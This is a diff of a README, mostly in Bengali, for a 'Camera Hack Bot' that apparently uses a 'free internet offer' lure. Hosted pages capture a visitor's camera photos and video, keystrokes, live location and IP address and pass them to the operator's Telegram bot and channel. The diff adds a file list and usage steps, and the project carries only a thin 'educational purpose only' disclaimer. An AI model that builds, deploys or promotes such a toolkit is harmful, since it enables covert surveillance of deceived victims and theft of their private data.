@@ -1,10 +1,5 @@
-# 📷 Camera Hack Bot – Free Internet Offer
-
-[![GitHub Pages](https://img.shields.io/badge/GitHub-Pages-blue?logo=github)](https://v4zrashd.github.io/rashd--camera-)
-[![Telegram](https://img.shields.io/badge/Telegram-Bot-blue?logo=telegram)](https://t.me/camerachckbot)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
-
-> ⚠️ **শিক্ষামূলক উদ্দেশ্যে তৈরি** – শুধুমাত্র নিজের ডিভাইসে টেস্ট করুন। অনুমতি ছাড়া ব্যবহার বেআইনি।
+> ⚠️ **শিক্ষামূলক উদ্দেশ্যে তৈরি** – শুধুমাত্র নিজের ডিভাইসে টেস্ট করুন। অনুমতি ছাড়া ব্যবহার বেআইনি।  
+> **Educational purpose only** – test on your own device. Unauthorized use is illegal.
 
 ---
 
@@ -31,4 +26,72 @@
 - **হোস্টিং**: GitHub Pages (ফ্রি)
 - **এপিআই**: Telegram Bot API, ipify.org, OpenStreetMap
 
+---
 
+## 📁 ফাইল স্ট্রাকচার (File Structure)
+
+```
+
+├── index.html                 # মূল পেজ (Main page)
+├── front_camera.html          # সামনের ক্যামেরা
+├── back_camera.html           # পিছনের ক্যামেরা
+├── front_video.html           # সামনের ভিডিও
+├── back_video.html            # পিছনের ভিডিও
+├── keyboard.html              # কিবোর্ড ক্যাপচার
+├── location.html              # লাইভ লোকেশন
+├── ip.html                    # আইপি অ্যাড্রেস
+├── README.md                  # এই ফাইল
+└── screenshot_*.png           # স্ক্রিনশট
+
+```
+
+---
+
+## 🚀 কিভাবে ব্যবহার করবেন (How to Use)
+
+1. **GitHub Pages** এ হোস্ট করা লিংক ওপেন করুন:  
+   👉 [https://v4zrashd.github.io/rashd--camera-](https://v4zrashd.github.io/rashd--camera-)
+
+2. আপনার পছন্দের অপশন সিলেক্ট করুন (Front/Back Camera, Video, Keyboard, Location, IP)।
+
+3. **টেলিগ্রাম বট** স্বয়ংক্রিয়ভাবে ডেটা গ্রহণ করবে এবং পাঠাবে।
+
+4. সব ডেটা আপনার টেলিগ্রাম চ্যানেলে ( [@v4zrasehd](https://t.me/v4zrasehd) ) পৌঁছাবে।
+
+---
+
+
+---
+
+## 📸 স্ক্রিনশট (Screenshots)
+
+> নিচের ছবিগুলো GitHub-এ শো করবে (সোর্স ফোল্ডারে উপলব্ধ)
+
+| | |
+|:-------------------------:|:-------------------------:|
+| ![Screenshot 1](Screenshot_20260806-013724.png) | ![Screenshot 2](Screenshot_20260806-013736.png) |
+| ![Screenshot 3](Screenshot_20260806-013922.png) | |
+
+---
+
+## 📢 টেলিগ্রাম চ্যানেল
+
+👉 [@v4zrasehd](https://t.me/v4zrasehd) – সব আপডেট ও সাপোর্ট পাবেন এখানে।
+
+---
+
+## ⚠️ দাবিত্যাগ (Disclaimer)
+
+এই প্রজেক্ট শুধুমাত্র শিক্ষামূলক ও গবেষণার উদ্দেশ্যে তৈরি। এটি ব্যবহার করে কোনো অবৈধ কার্যকলাপ করলে তার দায়িত্ব সম্পূর্ণ ব্যবহারকারীর। লেখক কোনো দায়িত্ব গ্রহণ করবেন না।
+
+---
+
+## 📄 লাইসেন্স (License)
+
+MIT License – যেকোনো কাজে ব্যবহার করতে পারবেন, তবে ক্রেডিট দিয়ে ব্যবহার করুন।
+
+---
+
+**ধন্যবাদ!** 🙏  
+**Made with ❤️ by v4zRashd**
+```
